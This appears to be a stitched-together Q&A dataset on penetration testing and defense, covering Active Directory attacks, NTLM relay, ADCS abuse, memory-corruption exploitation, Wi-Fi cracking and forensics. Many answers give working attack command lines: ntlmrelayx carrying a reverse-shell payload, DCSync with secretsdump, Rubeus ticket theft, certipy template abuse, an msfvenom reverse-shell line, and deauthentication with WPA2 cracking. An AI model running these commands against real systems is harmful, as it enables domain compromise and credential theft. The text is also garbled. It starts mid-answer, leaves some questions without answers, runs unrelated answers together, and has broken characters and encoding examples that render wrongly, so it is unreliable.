tokens: SELECT 1, name, 3 FROM master..sysdatabases. Encoding: if filter blocks UNION, try: UNiOn, UN/*comment*/ION, UNION%20SELECT. Defense: parameterised queries (prepared statements); ORMs that use parameterised queries; input validation; WAF (bypassable but adds friction).
How do you use Burp Suite for manual web application testing?

Burp Suite workflow for manual web application testing: Setup: configure browser proxy to 127.0.0.1:8080; install Burp CA certificate (http://burpsuite/ in browser); add target to scope (Target > Scope > Include in scope). Proxy: intercept every request; forward (not intercept) to browse normally; Proxy > HTTP History shows all traffic; right-click interesting requests to Send to Repeater, Scanner, Intruder, Comparer. Repeater: modify and resend individual requests; test injection points manually; change parameter values, headers, methods; observe responses. Intruder: automated fuzzing; select insertion point (parameter value to fuzz); attack types: Sniper (one parameter, one payload list), Cluster Bomb (multiple parameters, multiple lists = all combinations -- good for credential stuffing); Pitchfork (multiple parameters, step through lists in parallel); Payload: wordlist for directory brute force, common passwords, SQLi payloads. Scanner (Pro): active scan selected requests; passive scan all traffic automatically; findings in Dashboard. Collaborator (Pro): out-of-band interaction detection for blind SSRF, blind XXE, blind SQLi; generates unique subdomain (uuid.burpcollaborator.net); any DNS/HTTP/SMTP interaction logged; paste payload into parameter and check Collaborator for callbacks. Extensions: JSON Web Tokens (JWT Editor); HTTP Request Smuggler; InQL (GraphQL); Autorize (IDOR/auth testing -- replay requests as low-priv user automatically); ActiveScan++ (additional checks); Param Miner (discover hidden parameters). Workflow: crawl with Spider, identify all params, manual test high-value endpoints, run scanner on authenticated session.
How do you exploit unconstrained Kerberos delegation?

Unconstrained delegation: service configured with TrustedForDelegation=True; when user authenticates to service, their TGT (Ticket Granting Ticket) is stored in service memory; service can impersonate user to ANY other service in domain -- unconstrained. Attack: if you compromise a server with unconstrained delegation: Rubeus.exe monitor /interval:5 /nowrap (watches LSASS for new TGTs); Spooler bug (PrinterBug): coerce Domain Controller to authenticate to your unconstrained delegation server: SpoolSample.exe DC01.corp.local UNCONSTRAINED.corp.local (triggers DC machine account authentication); DC TGT arrives; import DC TGT: Rubeus.exe ptt /ticket:DCMACHINE_TGT; DCSync as DC machine account: secretsdump.py -k -no-pass DC01.corp.local (extract all hashes using DC machine account). Persistence: imported TGT is valid (10 hours); can be renewed (7 days); during window: full domain compromise. Finding unconstrained delegation machines: BloodHound query: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c; or PowerView: Get-DomainComputer -Unconstrained. Constrained delegation is safer (only specific SPNs); Resource-Based Constrained Delegation (RBCD) is an alternative attack if you have GenericAll/GenericWrite on machine account. Defense: never configure unconstrained delegation except on DCs (required); use constrained delegation with Protocol Transition for specific use cases; mark sensitive accounts (krbtgt, domain admins) as Account is sensitive and cannot be delegated.
Explain NTLM relay attacks and how to chain them for maximum impact.

NTLM relay: intercept NTLM authentication attempt and relay it to a target server to authenticate as the victim. Components: (1) Capture mechanism: Responder poisoning (LLMNR/NBT-NS); MITM via ARP poisoning; Spooler bug/PetitPotam forcing DC authentication. (2) Relay tool: ntlmrelayx.py -tf targets.txt -smb2support (Impacket); relay to all hosts in targets.txt. (3) Target selection: hosts where SMB signing is disabled (default on non-DC Windows workstations); check signing: crackmapexec smb subnet --gen-relay-list relay_targets.txt. Attack chains: Basic relay to get shells: ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64_REVERSE_SHELL"; victim authenticates to Responder; relayed to target; command executed as victim. LDAP relay for AD takeover: ntlmrelayx.py --no-smb-server -t ldaps://DC01 --delegate-access --escalate-user compromised_machine; relay to LDAP with RBCD attack; gives compromised machine delegation rights over victim machine. Relay to ADCS (Active Directory Certificate Services): ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DomainController; relay DC auth to ADCS; receive Domain Controller certificate; use with PKINIT to get DC TGT = full domain compromise (ESC8 vulnerability). Combining attacks: PetitPotam -> ntlmrelayx -> ADCS -> DC certificate -> Golden Ticket without needing krbtgt hash. Defense: enable SMB signing everywhere; disable LLMNR and NBT-NS; disable WebDAV; enable Extended Protection for Authentication (EPA) on ADCS; require HTTPS for ADCS web enrollment.
What is RBCD (Resource-Based Constrained Delegation) and how do you exploit it?

Resource-Based Constrained Delegation (RBCD): delegation model where the target resource (service) specifies which accounts are allowed to delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity attribute on target computer object). Why exploitable: if you have GenericAll, GenericWrite, WriteProperty, or WriteDACL on a computer account, you can set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on it; this allows a controlled machine account to impersonate ANY user to the target. Attack prerequisites: GenericWrite or higher over a computer object (common in AD environments); ability to create a machine account (by default all domain users can create up to 10 machine accounts -- ms-DS-MachineAccountQuota). Steps: (1) Create machine account: addcomputer.py domain/user:pass@DC -computer-name "EVILMACHINE$" -computer-pass "Password1!". (2) Set RBCD: rbcd.py -f EVILMACHINE -t TARGET_COMPUTER -dc-ip DC domain/user:pass (sets msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET). (3) Get service ticket: getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain/EVILMACHINE$:Password1!. (4) Use ticket: KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass TARGET.domain.local. BloodHound shows this attack path: GenericWrite edge from compromised account to computer object -> RBCD attack path to compromise that machine. Defense: restrict ms-DS-MachineAccountQuota to 0 for regular users; audit msDS-AllowedToActOnBehalfOfOtherIdentity attribute changes; restrict who has GenericWrite on computer objects.
How do you attack Active Directory Certificate Services (ADCS)?

ADCS (Active Directory Certificate Services) is Microsoft PKI; heavily integrated with AD; multiple attack vectors. ESC1 (misconfigured certificate template): template allows requestor to specify Subject Alternative Name (SAN) = any user including Domain Admin; ENROLLEE_SUPPLIES_SUBJECT flag enabled; any enroller can request cert for DA. Exploit: certipy req -ca "CA-NAME" -template "VulnTemplate" -upn administrator@domain.local -dc-ip DC. ESC2: template has Any Purpose EKU or no EKU restriction; can be used as subordinate CA to sign any cert. ESC3: enrollment agent template + EKU = Certificate Request Agent; enroll as agent, then enroll on behalf of any user for any template. ESC4: low-priv user has write permissions on template; modify template to add ENROLLEE_SUPPLIES_SUBJECT flag; exploit as ESC1. ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA; any template allows requestor-supplied SAN; exploit any template. ESC8 (NTLM relay to ADCS HTTP endpoint): relay DC machine account auth to ADCS Web Enrollment; receive DC certificate; PKINIT auth with DC cert = TGT for DC machine account = DCSync. Certipy tool (the standard for ADCS attacks): certipy find -u user@domain -p pass -dc-ip DC (enumerate vulnerable templates and CA config); certipy auth -pfx admin.pfx -dc-ip DC (authenticate with certificate to get TGT and NTLM hash). Defense: audit ADCS templates (Certipy find or PSPKIAudit); remove dangerous flags; restrict enrollment permissions; require CA manager approval for sensitive templates; enable HTTPS on ADCS web enrollment + EPA to prevent relay.
Explain Pass-the-Ticket attack in Kerberos.

Pass-the-Ticket (PtT): steal Kerberos tickets from memory and use them to authenticate without knowing the account password. Kerberos tickets (TGT or TGS) stored in memory; valid for their lifetime (TGT = 10 hours, renewable for 7 days; TGS = 10 hours). Extracting tickets: Mimikatz on Windows: privilege::debug; sekurlsa::tickets /export (dumps all Kerberos tickets from LSASS to.kirbi files). Rubeus: Rubeus.exe dump /service:krbtgt (dump TGTs); dump /luid:0xdeadbeef (dump specific logon session tickets). Import and use: Mimikatz: kerberos::ptt ticket.kirbi (inject into current session); Rubeus: Rubeus.exe ptt /ticket:BASE64_TICKET. After import: klist (list current tickets); dir \DC01\C$ (access with stolen ticket). From Linux: secretsdump.py with ccache files; KRB5CCNAME=/path/to/ticket.ccache; psexec.py -k -no-pass target.corp.local. Golden vs Silver vs PtT: PtT uses real stolen tickets; Golden Ticket forges TGT with krbtgt hash; Silver Ticket forges TGS for specific service with service account hash. Silver Ticket: forge TGS for specific service (CIFS, HTTP, HOST) using service account hash; no DC interaction needed; harder to detect (no 4768/4769 events for ticket request); TGS encrypted with service hash only; scope limited to that service. Defense: enable Credential Guard (protects LSASS in VBS; prevents Mimikatz from reading tickets); reduce ticket lifetimes; monitor for pass-the-ticket behavior (same user, different IPs in short time); Protected Users security group.
How do you perform lateral movement via WMI?

WMI (Windows Management Instrumentation) lateral movement: legitimate Windows management mechanism abused for stealthy lateral movement. Why WMI: built into all Windows versions; often allowed through enterprise firewalls; less monitored than PsExec; firewall rule typically open for management. Command execution: wmiexec.py domain/user:pass@TARGET (Impacket -- semi-interactive shell via WMI; creates process, reads output via share). PowerShell: Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc BASE64" -ComputerName TARGET -Credential $creds. CrackMapExec: cme smb TARGET -u user -p pass -x "whoami" --exec-method wmiexec. WMI event subscription (persistence): create permanent WMI subscription: EventFilter (trigger: on system startup, time, event log entry) + EventConsumer (action: run command, execute script) + FilterToConsumerBinding; survives reboot; runs as SYSTEM; hard to detect without specific WMI monitoring. Invoke-WMIEvent (PowerSploit): set up persistent WMI subscription for backdoor. Detection: Sysmon Event 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventConsumerToFilter) -- for WMI event subscriptions; Sysmon Event 1 (Process Create) with parent process WmiPrvSE.exe -- indicates WMI process creation; Process creation via WMI shows as child of WmiPrvSE.exe; monitor for WmiPrvSE.exe spawning cmd.exe, PowerShell, unusual processes. Defense: enable Sysmon with WMI event IDs; restrict WMI access via firewall; use Windows Defender Application Control (WDAC) to restrict WMI abuse.
Explain buffer overflow exploitation basics.

Buffer overflow: write more data into a fixed-size buffer than it can hold; overwrite adjacent memory including return address. Stack-based buffer overflow: local variables stored on stack; return address (RET) on stack above local variables; overwrite local buffer past its boundary to reach and overwrite RET; control EIP/RIP = control execution flow. Fuzzing: send progressively longer input until crash; cyclic pattern (Metasploit pattern_create / pwndbg cyclic) to find exact offset to RET. GDB/pwndbg: run program, trigger crash, info registers (find EIP value); cyclic_find(EIP_VALUE) = offset to RET. Control flow: at offset X, write: JUNK_PADDING (X bytes) + NEW_RET_ADDRESS (4 bytes for 32-bit, 8 bytes for 64-bit) + SHELLCODE. Finding shellcode location: if stack randomised (ASLR), need to leak stack address or find static address; return to shellcode in fixed buffer or use return-to-libc/ROP. Shellcode: NOP sled ( repeated) before shellcode increases reliability; null-byte free shellcode if input processed as string; generate with msfvenom: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -b "�". Protections to bypass: NX/DEP: non-executable stack = use ROP (Return Oriented Programming) -- chain existing code gadgets (ret instructions within libc/binary). ASLR: leak address via format string or info disclosure to compute libc base at runtime. Stack canary: leak canary value via format string, include correct canary in payload. PIE: need to leak binary base address before computing gadget addresses.
What is Return Oriented Programming (ROP) and how does it work?

ROP (Return Oriented Programming): code reuse attack that bypasses NX/DEP by chaining existing code fragments (gadgets) in legitimate executables. Why needed: NX (No-Execute) marks stack as non-executable; shellcode on stack cannot execute. ROP idea: instead of executing new code, repurpose existing instructions ending in RET; each gadget executes a few instructions then RET; RET pops next address from stack; chain gadgets by carefully crafting stack contents. Gadget types: pop rdi; ret (load argument to rdi register on x64 = first function argument); pop rsi; ret (second argument); pop rdx; ret (third argument); call or jmp to function; system call (syscall or int 0x80). Finding gadgets: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"; ropper -f binary --search "pop rdi"; pwntools: elf.search(asm("pop rdi; ret")). ret2libc (classic ROP): call system("/bin/sh") using libc; gadgets: pop rdi; ret (set rdi=/bin/sh address); system() address; overflow buffer to: [pop_rdi_ret] + [bin_sh_address] + [system_address]. ret2plt: call plt stub of system which jumps to GOT entry; bypasses ASLR if libc not randomised (rare now). ASLR bypass: need libc base address; leak via format string (%p to print stack pointer), puts() to print GOT entry and calculate libc base, or ret2plt of puts to print GOT. pwntools: automates gadget search, offset finding, payload construction; p32()/p64() for address packing; process(), remote() for target.
How do you exploit format string vulnerabilities?

Format string vulnerability: user-controlled string passed directly as format argument to printf/sprintf/fprintf without format specifier. Vulnerable code: printf(user_input) vs safe code: printf("%s", user_input). Primitives: (1) Information leak: %p prints stack value as pointer; %x prints hex; printf("%p %p %p %p %p %p %p %p") reads 8 values from stack -- local variables, return addresses, stack canary, libc pointers; used to bypass ASLR and canary. (2) Crash: %s dereferences stack value as string pointer; if stack value not valid pointer, segfault. (3) Arbitrary read: %N$p reads Nth argument from stack; %100$p reads 100th stack position; string "AAAA%7$p" if 7th position contains pointer to AAAA (input buffer), confirms offset for further exploitation. (4) Arbitrary write: %n writes number of bytes written so far into the address pointed to by next argument; %hn writes 2 bytes; %hhn writes 1 byte; used to overwrite GOT entries, return addresses, saved registers. Technique: control position of target address on stack (input buffer may be on stack); use positional specifier %N$n to write to target address. pwntools: fmtstr_payload(offset, {target_address: value_to_write}) generates format string payload automatically. Example: overwrite GOT entry of exit() with address of win() function; next time exit() called, win() executes. Exploitation on 64-bit: addresses contain null bytes (�) which terminate strings; must use different techniques (short writes or use addresses in binary that do not contain nulls).
How do you perform mobile application security testing on Android?

Android security testing methodology: Setup: Android emulator (AVD) or physical device with USB debugging; Burp proxy configured; adb proxy: adb shell settings put global http_proxy BURP_IP:8080; install Burp CA cert: adb push BurpCA.cer /sdcard/; device Settings > Security > Install from storage. Dynamic analysis: frida-server on device: adb push frida-server /data/local/tmp; adb shell chmod 755 /data/local/tmp/frida-server; adb shell /data/local/tmp/frida-server &. Objection (Frida wrapper): objection -g com.app.package explore; android sslpinning disable (bypass pinning); android root disable (bypass root detection); android clipboard monitor (capture clipboard). Root detection bypass methods: apps check for root to prevent reverse engineering or policy violations. What are common misconfigurations in Kubernetes that lead to compromise?

Kubernetes misconfiguration vulnerabilities: (1) API server exposed to internet: kubectl get pods from internet = full cluster access if misconfigured; should be private or behind VPN; check: nmap -p 6443,8443 cluster-ip. (2) Anonymous access enabled: --anonymous-auth=true allows unauthenticated API requests; combined with permissive RBAC = full access without auth. (3) Dashboard without auth: Kubernetes Dashboard with --enable-skip-login or without authentication; internet-exposed = cluster takeover. (4) Privileged pods: securityContext.privileged: true gives all capabilities; mount host filesystem; escape to host. (5) hostNetwork/hostPID: pod runs in host network/PID namespace; can sniff all host network traffic; can access processes outside container. (6) Writable host path mounts: volumes.hostPath mounting /etc, /var/run/docker.sock, or /proc grants container broad host access. (7) ServiceAccount token automount: by default all pods get service account token; if pod is compromised, attacker gets token; use automountServiceAccountToken: false when not needed. (8) Over-permissive NetworkPolicy: by default no network isolation between pods; any pod can reach any other pod; implement NetworkPolicy for zero-trust between pods. (9) etcd not encrypted: etcd stores all cluster state including secrets; if etcd port 2379 accessible, read all secrets in plaintext (if encryption at rest not configured). (10) Image pull from untrusted registry: using latest tag from Docker Hub; image can be updated with malicious code; pin to digest (sha256:...). Tools: kube-bench (CIS benchmark checks); kube-hunter (active security testing); trivy k8s --report summary cluster (cluster vulnerability scan).
Explain how to enumerate and exploit Azure AD vulnerabilities.

How do you build and use a threat intelligence program?

Threat intelligence program: collect, analyse, and distribute actionable information about adversary TTPs, IOCs, and threat actors. Intelligence types: (1) Strategic: high-level trends, industry targeting; for CISO and board; example: ransomware groups targeting healthcare sector increased 87% in past year. (2) Operational: specific campaigns and attacker infrastructure; for SOC managers; example: APT29 phishing campaign targeting government using specific lure themes. (3) Tactical: TTPs (Techniques, Tactics, Procedures) mapped to MITRE ATT&CK; for detection engineers; example: threat actor uses T1566.001 Spearphishing Attachment with.xlsm files. (4) Technical: IOCs (IPs, domains, hashes, URLs); for SOC analysts and security tools; example: C2 IP 1.2.3.4, malware hash abc123. Sources: commercial feeds (Recorded Future, Mandiant, CrowdStrike Intel -- high signal, curated, expensive); open-source (AlienVault OTX, MISP communities, Abuse.ch, Emerging Threats, URLhaus, MalwareBazaar); government (CISA, FBI Flash alerts, NCSC); ISAC (Information Sharing and Analysis Center -- sector-specific sharing: FS-ISAC for finance, H-ISAC for healthcare). Operationalisation: ingest IOCs into SIEM (auto-blocklist for high-confidence, alert-only for medium); enrich alerts with threat intel context; TIP (Threat Intelligence Platform) for aggregation and normalisation; MISP for sharing and correlation; STIX/TAXII format for structured sharing. Lifecycle: direction (what are we trying to learn?) -- collection -- processing (parsing, deduplication) -- analysis (context, relevance) -- dissemination (to right audience in right format) -- feedback.
How do you attack WPA2 enterprise networks?

WPA2 Enterprise uses 802.1X with RADIUS server for authentication; each user has individual credentials (unlike WPA2-PSK with shared key). Attack surfaces: (1) Evil twin attack: create rogue AP with same SSID and 802.1X; use hostapd-wpe (Wireless Pwnage Edition) or EAPHammer; clients connect to evil twin; attempt EAP authentication; evil twin captures MSCHAPV2 challenge-response (NTLMv2 hash); crack offline with asleap or john. (2) EAP type downgrade: if client accepts PEAP-MSCHAPv2 but also accepts weaker EAP types; configure evil twin to offer weaker EAP; extract credentials. (3) Certificate validation bypass: PEAP wraps MSCHAPv2 in TLS tunnel; if client does not validate server certificate (common misconfiguration), evil twin presents self-signed cert; client accepts; credentials captured in tunnel. (4) PMKID attack: for WPA2-PSK networks, capture PMKID from single frame without deauthenticating clients: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1; extract PMKID: hcxpcapngtool capture.pcapng -o hash.22000; crack: hashcat -m 22000 hash.22000 wordlist.txt. (5) KARMA attack: Android/iOS probe for known network names; rogue AP responds to all probes; clients auto-connect. Tools: hostapd-wpe; EAPHammer; airbase-ng; hostapd with configuration. Defense: validate server certificate and pin to specific CA/certificate; use EAP-TLS (certificate-based client auth -- no password to steal); disable weaker EAP types; WPA3 Enterprise with 192-bit security.
How do you crack WPA2 PSK passwords?

WPA2-PSK cracking: capture 4-way EAPOL handshake then crack offline. Step 1 -- capture handshake: put adapter in monitor mode: airmon-ng start wlan0; scan: airodump-ng wlan0mon; target specific AP: airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon; deauthenticate client to force reconnection and capture handshake: aireplay-ng -0 1 -a BSSID -c CLIENT_MAC wlan0mon; wait for EAPOL handshake in airodump-ng output. Step 2 -- crack: convert to hashcat format: hcxpcapngtool capture.cap -o hash.22000; dictionary attack: hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt; rules-based: hashcat -m 22000 hash.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule; mask attack (8-digit phone number): hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d; hybrid (wordlist + mask -- word + 4 digits): hashcat -m 22000 hash.22000 -a 6 rockyou.txt ?d?d?d?d. PMKID attack (no handshake needed): hcxdumptool captures PMKID from AP beacon; works without any clients connected; hashcat -m 22000. Speed: RTX 4090 cracks WPA2 at ~700,000 hashes/second; 8-char lowercase = 26^8 = 208 billion combos = 3.5 days; with GPU cluster (vast.ai), much faster. WPA3 SAE (Simultaneous Authentication of Equals): forward-secret; PSK not directly used in handshake derivation; dictionary attack much slower (no offline cracking -- must interact with AP for each guess). Defense: passphrase > 20 characters with random characters; avoid dictionary words; use WPA3 if available.
What is 802.1X and how can it be bypassed?

802.1X is IEEE standard for port-based Network Access Control (NAC); authenticates devices before granting network access. Components: Supplicant (client device with 802.1X software); Authenticator (network switch/AP with 802.1X enforcement); Authentication Server (RADIUS server that validates credentials). EAP methods: EAP-TLS (mutual certificate authentication -- most secure); PEAP-MSCHAPv2 (server certificate + user credentials in TLS tunnel -- common); EAP-MD5 (weak, deprecated -- no server auth). Bypass techniques: (1) MAC spoofing: some networks use MAB (MAC Authentication Bypass) for devices that cannot do 802.1X (printers, cameras); whitelist of MAC addresses; spoof a whitelisted MAC to bypass 802.1X entirely; discover whitelisted MACs from ARP tables or physical device inspection. (2) Piggyback on authenticated session: connect unmanaged hub between authenticated device and switch port; switch sees authenticated MAC from legitimate device; attacker on hub gets network access; MAC flooding can confuse switch. (3) VLAN hopping: if guest VLAN accessible, use VLAN hopping (double-tag or DTP trunk negotiation) to reach corporate VLAN. (4) EAPOL logoff injection: send EAPOL-Logoff frame spoofed as authenticated client to disconnect them; attacker plugs in during gap. (5) Certificate bypass (if no client cert validation): if RADIUS does not verify client certificate or uses weak validation, forge certificate. (6) RADIUS server attack: compromise RADIUS server; grant access to any device. Defense: require EAP-TLS with client certificates (not just server validation); disable MAB where possible; use posture assessment (NAC checks for antivirus, patch level); monitor for rogue 802.1X attempts.
How do you exploit ProxyLogon (CVE-2021-26855) in Microsoft Exchange?

ProxyLogon: pre-authentication SSRF in Microsoft Exchange Server enabling authentication bypass and RCE. CVE-2021-26855 (SSRF) + CVE-2021-27065 (post-auth arbitrary file write) = unauthenticated RCE. Affected: Exchange Server 2013, 2016, 2019 (before March 2021 patches). CVE-2021-26855 detail: Exchange Client Access Service proxies requests to backend Exchange services using cookies; X-AnonResource-Backend header specifies backend URL; attacker forges backend URL to reach Exchange backend with a crafted cookie that bypasses authentication. SSRF achieves authentication as any user including Administrator. CVE-2021-27065 detail: after authentication as admin, the New-ExchangeCertificate cmdlet allows writing files to arbitrary paths on disk; write a webshell to Exchange web directory (C:\inetpub\wwwrootspnet_client\). Full chain: authenticate via SSRF (26855) as admin; write aspx webshell via file write (27065); execute commands via webshell. Detection: look for suspicious OAB (Offline Address Book) virtualDirectory changes in Exchange audit logs; aspx files in spnet_client\ or Exchange frontend directories; network connections from Exchange server to external IPs; IIS logs showing POST requests to unusual paths. What is heap exploitation and what common techniques exist?

Heap exploitation: attack the dynamic memory allocator to corrupt heap metadata or data, leading to arbitrary read/write. Heap basics: malloc() allocates chunks; each chunk has metadata (size, prev_in_use flags); free() returns chunk to freelist (bins); next malloc of same size returns from bin. Use-After-Free (UAF): access memory after free(); dangling pointer still points to freed chunk; allocate new object in same chunk; old code reads/writes new object contents; type confusion or controlled data in freed location. Double Free: free same pointer twice; corrupts freelist; next allocation returns same address twice; two objects occupy same memory. Heap overflow: write past end of heap chunk; overwrite metadata of next chunk (size field, forward/backward pointers in freelist). Techniques: (1) tcache poisoning (glibc 2.26+): tcache (thread-local cache) is a single-linked list; no security checks (no safe-unlink); overwrite fd pointer in freed chunk; next malloc returns attacker-chosen address; write arbitrary data. (2) Fastbin attack: similar to tcache but fastbin has partial checks; overwrite fd pointer; allocate twice; return to arbitrary address. (3) Unsafe unlink: overflow to corrupt chunk prev_size and prev_in_use; trigger free of next chunk; coalesce overwrites arbitrary memory via FD->bk = BK, BK->fd = FD. (4) House of Orange: create chunk overlapping top chunk; reduce top chunk size; force malloc to create new heap segment; exploit. Tools: pwndbg (heap visualization: vis_heap_chunks, heap, bins); GEF; pwntools for exploit scripting.
What is the incident response lifecycle and how do you manage a major incident?

Incident Response (IR) lifecycle (NIST SP 800-61): (1) Preparation: build IR capability before incidents happen; document IR plan and playbooks; assemble IR team; deploy logging and monitoring; establish communication channels and external contacts (legal, PR, law enforcement, forensics vendor). (2) Detection and Analysis: alert fires (SIEM, EDR, threat hunt); analyst investigates: is this a true positive or false positive? If TP: what is the scope? Which systems affected? What data potentially compromised? Initial severity classification: P1 (business-critical systems, data breach) to P4 (minor). (3) Containment: prevent spread; short-term (isolate affected host from network -- EDR network isolation, VLAN change); long-term (patch vulnerable systems, reset compromised credentials); evidence preservation (forensic image before containment if possible). (4) Eradication: remove attacker from environment; delete malware, backdoors, webshells; close all persistence mechanisms (scheduled tasks, registry keys, new accounts); reset all compromised credentials (not just the obvious ones); change krbtgt password twice if domain compromise suspected. (5) Recovery: restore systems from clean backups; harden before reconnecting; monitor closely for reinfection; phased restoration (least critical first). (6) Post-Incident Activity: lessons learned meeting within 2 weeks; root cause analysis; what detection failed, what response worked; update playbooks; detection improvements implemented. War room management: Incident Commander coordinates; separate channels for technical (forensics), management (status updates), legal/comms; timeline document tracks all findings; brief executive team at defined intervals; legal hold for relevant logs and evidence.
How do you perform digital forensics on a compromised Windows system?

Windows forensics methodology: (1) Evidence acquisition: forensic image full disk (FTK Imager, dd, dcfldd); preserve volatile data first (memory): WinPmem, Magnet RAM Capture; document chain of custody; write-block physical drives if possible; cloud forensics: snapshot EC2 instance, image snapshot in new environment. (2) Memory analysis: Volatility framework: python3 vol.py -f memory.raw windows.pslist (running processes); windows.cmdline (command lines of processes); windows.netscan (network connections); windows.malfind (injected code, suspicious memory regions with execute permissions); windows.dlllist (loaded DLLs); windows.handles (open files and keys). (3) Registry analysis: SYSTEM hive: services (HKLM\SYSTEM\CurrentControlSet\Services -- look for new services); hardware history. SOFTWARE hive: installed programs, autorun locations. NTUSER.DAT (per user): MRU lists (recently opened files), UserAssist (programs run), shell bags (folder access history), recent documents. Malware persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (auto-start). (4) Event log analysis: Security log: 4624 (logons), 4625 (failed logons), 4648 (explicit credential logon), 4688 (process creation if audited), 4698 (scheduled task), 7045 (service install). System log: 7034/7036 (service state changes). PowerShell: 4103 (module logging), 4104 (script block). (5) File system: $MFT parsing (all file activity, timestamps); prefetch files (C:\Windows\Prefetch -- evidence of program execution); browser history, downloads; LNK files (recent files accessed). (6) Timeline: create super-timeline with Plaso/log2timeline combining all artifacts into chronological view for reconstruction.
What is the chain of custody in digital forensics and why does it matter?

Chain of custody: documented record of who had access to evidence, when, and what was done with it; ensures evidence integrity and admissibility in legal proceedings. Why it matters: if chain of custody is broken, defense can argue evidence was tampered with, making it inadmissible in court; even for internal investigations, proper documentation supports HR actions and demonstrates due process. Elements of chain of custody documentation: evidence item description (device make, model, serial number, hard drive size, hash); acquisition details (date, time, location, acquiring analyst, method used, tool and version); cryptographic hash (MD5 or SHA-256 of acquired image -- proves no modification); storage location and access log (who removed from evidence storage, for what purpose, when returned); each transfer of custody documented with signatures. Acquisition best practices: write-block physical drive before imaging to prevent accidental modification; FTK Imager or dcfldd for forensic image; verify hash after imaging (source hash must match image hash); label evidence with unique case number and item number; use tamper-evident bags for physical media. Chain of custody for volatile data: memory forensics tools (WinPmem) record timestamp, system information, analyst; memory hash computed immediately after acquisition. Documentation: evidence tracking spreadsheet or case management system (Autopsy, EnCase, FTK); litigation hold notice preserves original data; maintain until statute of limitations expires. Expert witness testimony: forensic analyst must be able to testify about every step; any gap in documentation undermines testimony.
How do you prevent command injection vulnerabilities?

Command injection: user input passed to system shell commands; attacker injects additional commands. Vulnerable pattern (Python): import subprocess; result = subprocess.run("ping " + user_input, shell=True); attacker sends user_input=8.8.8.8; ls -la and ping command executes plus ls -la. Prevention: (1) Avoid shell=True: use list form to pass arguments directly: subprocess.run(["ping", user_input]) -- no shell interpretation; user_input cannot inject additional commands when passed as argument. (2) Allowlist validation: if input must be a hostname, validate: import re; if not re.match(r"^[a-zA-Z0-9.-]+$", user_input): raise ValueError("Invalid hostname"). (3) Avoid shell entirely: use native library equivalents: instead of os.system("nmap -p 80 " + host), use python-nmap library or socket API. Language-specific: PHP: escapeshellarg() wraps argument in single quotes and escapes internal single quotes; escapeshellcmd() escapes shell metacharacters -- but prefer exec($cmd, $args) without shell. Java: ProcessBuilder with argument list (not String command with shell); Runtime.exec(String[] cmdarray) not exec(String cmd). Node.js: child_process.execFile(command, [args]) instead of exec(string); spawn with array of arguments. Testing: inject: ; whoami, | id, && cat /etc/passwd, $(id), `id`, %0A whoami (URL-encoded newline). OWASP: command injection ranked in OWASP Top 10; A03:2021-Injection; use SAST tools (Bandit for Python, Semgrep rules) to detect vulnerable patterns in CI.
What are secure coding practices for cryptography?

Cryptography secure coding: use established libraries, never implement your own crypto. Key principles: (1) Use standard libraries: Python: cryptography library (pyca/cryptography); Java: JCE with Bouncy Castle provider; Node.js: crypto module (built on OpenSSL); avoid implementing AES, RSA, or ECDSA from scratch -- correct implementation is extremely difficult. (2) Symmetric encryption: use AES-256-GCM (Authenticated Encryption with Associated Data -- AEAD); provides both confidentiality and integrity; always use random IV/nonce (96 bits for GCM); never reuse nonce with same key (catastrophic for GCM); key derivation: use PBKDF2 (600,000 iterations, SHA-256), bcrypt (cost factor 12+), or Argon2id for password-based key derivation. (3) Asymmetric encryption: RSA minimum 2048 bits (prefer 4096 or ECDSA); use OAEP padding for RSA encryption (never PKCS#1 v1.5 -- vulnerable to padding oracle); for signatures: ECDSA with P-256 or Ed25519. (4) Hashing: SHA-256 or SHA-3 for general hashing; bcrypt, Argon2id, scrypt for passwords (NOT plain SHA or MD5); never store passwords as plain SHA-256 hash (rainbow tables, fast GPU cracking). (5) Random numbers: use CSPRNG: secrets module (Python), SecureRandom (Java), crypto.randomBytes() (Node.js); never use math.random() or random.random() for security-sensitive values (session IDs, tokens, nonces). (6) Key management: store keys in HSM or key management service (AWS KMS, HashiCorp Vault); never hardcode keys in source code; rotate keys regularly; separate keys per environment.
How do you implement input validation and output encoding?

Input validation and output encoding are the primary defenses against injection attacks. Input validation: validate ALL untrusted input (user input, API responses, file contents, environment variables); allowlist approach (define what is valid): string: regex pattern, max length, allowed characters; integer: min/max range, parse to int and reject non-numeric; email: RFC-compliant regex; file: extension whitelist, MIME type check, max size; reject anything that does not match expected format. Validation vs sanitisation: prefer validation (reject invalid input) over sanitisation (try to fix invalid input); sanitisation is complex and often incomplete; if must sanitise, use well-tested libraries (OWASP Java Encoder, DOMPurify for HTML). Output encoding: encode output for the context where it will be placed to prevent injection. HTML context: HTML entity encode: < to <, > to >, & to &, " to ", to '; prevents XSS; use OWASP Java Encoder: Encode.forHtml(untrustedData). JavaScript context: encode for JS string: \ to \\, " to ", newline to 
; use Encode.forJavaScript() or JSON.stringify(). URL context: URL-encode: urlencode() (PHP), urllib.parse.quote() (Python); prevents open redirect and parameter injection. SQL context: use parameterised queries (prepared statements) -- the ONLY reliable defense against SQLi; never concatenate user input into SQL. Shell context: avoid shell; if unavoidable, use argument list form (not shell=True). LDAP context: escape LDAP special characters: (,), *, \, NUL; use LDAP safe string libraries. CSS context: never put user data in CSS (style injection enables clickjacking, keylogging via CSS selectors).
What is Content Security Policy and how do you implement it properly?

